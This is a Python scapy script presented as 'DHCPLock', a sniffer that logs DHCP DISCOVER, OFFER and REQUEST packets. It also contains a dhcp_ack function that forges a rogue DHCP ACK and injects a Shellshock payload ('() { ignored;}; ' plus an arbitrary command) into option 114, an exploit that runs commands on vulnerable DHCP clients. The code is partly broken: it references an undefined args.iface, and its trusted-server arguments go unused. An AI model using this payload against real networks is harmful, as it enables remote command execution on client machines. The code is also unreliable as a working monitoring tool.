#!/usr/bin/env python3

from scapy.all import *
import logging
import argparse

#BOOTP
#siaddr = DHCP server ip
#yiaddr = ip offered to client
#xid = transaction id 
#chaddr = clients mac address in binary format

def dhcp_ack(raw_mac, xid, command):
	packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
	IP(src="192.168.2.1", dst='255.255.255.255') /
	UDP(sport=67, dport=68) /
	BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
	DHCP(options=[("message-type", "ack"),
		('server_id', '192.168.2.1'),
		('subnet_mask', '255.255.255.0'),
		('router', '192.168.2.5'),
		('lease_time', 172800),
		('renewal_time', 86400),
		('rebinding_time', 138240),
		(114, "() { ignored;}; " + command),
		"end"]))
	return packet


# Fixup function to extract dhcp_options by key
def get_option(dhcp_options, key):
    must_decode = ['hostname', 'domain', 'vendor_class_id']
    try:
        for i in dhcp_options:
            if i[0] == key:
                # If DHCP Server Returned multiple name servers 
                # return all as comma seperated string.
                if key == 'name_server' and len(i) > 2:
                    return ",".join(i[1:])
                # domain and hostname are binary strings,
                # decode to unicode string before returning
                elif key in must_decode:
                    return i[1].decode()
                else: 
                    return i[1]        
    except:
        pass


def dhcp(resp):
	if resp.haslayer(DHCP):
		mac_addr = resp[Ether].src

		if resp[DHCP].options[0][1] == 1:
			xid = resp[BOOTP].xid
			logging.info("[*] Got new DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
			hostname = get_option(resp[DHCP].options, 'hostname')
			logging.info(f"Host {hostname} ({resp[Ether].src}) asked for an IP")
			logging.info(resp.show())

		if resp[DHCP].options[0][1] == 2:
			xid = resp[BOOTP].xid
			logging.info("[*] Got new DHCP OFFER from: " + mac_addr + " xid: " + hex(xid))
			subnet_mask = get_option(resp[DHCP].options, 'subnet_mask')
			lease_time = get_option(resp[DHCP].options, 'lease_time')
			router = get_option(resp[DHCP].options, 'router')
			name_server = get_option(resp[DHCP].options, 'name_server')
			domain = get_option(resp[DHCP].options, 'domain')


			logging.info(f"DHCP Server {resp[IP].src} ({resp[Ether].src}) "
			      f"offered {resp[BOOTP].yiaddr}")


			logging.info(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
			      f"{lease_time}, router: {router}, name_server: {name_server}, "
			      f"domain: {domain}")

		if resp[DHCP].options[0][1] == 3:
			xid = resp[BOOTP].xid
			logging.info("[*] Got new DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
			requested_addr = get_option(resp[DHCP].options, 'requested_addr')
			hostname = get_option(resp[DHCP].options, 'hostname')
			logging.info(f"Host {hostname} ({resp[Ether].src}) requested {requested_addr}")
			logging.info(resp.show())


def main():
	# logger
	logging.basicConfig(filename='myapp.log', filemode='w', level=logging.INFO, format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s', datefmt='%m-%d %H:%M')
	console = logging.StreamHandler()
	console.setLevel(logging.INFO)
	formatter = logging.Formatter('%(name)-12s: %(levelname)-8s %(message)s')
	console.setFormatter(formatter)
	logging.getLogger().addHandler(console)
	#args_parser
	parser = argparse.ArgumentParser(description='DHCPLock', epilog='Lock dem baby!')
	parser.add_argument('-n', '--quantity', type=str, help='The number of trusted DHCP servers')
	parser.add_argument('-s', '--servers', type=str, help='Trusted DHCP servers` IP addresses')
	args = parser.parse_args()
	# settings for interface and dhcplock_filter
	interface = 'enp0s8'
	dhcplock_filter = 'udp and (port 67 or 68)'
	logging.info("[*] Waiting for a DHCP Packets...")
	sniff(iface=interface, filter=dhcplock_filter, prn=dhcp)


if __name__ == '__main__':
	main()
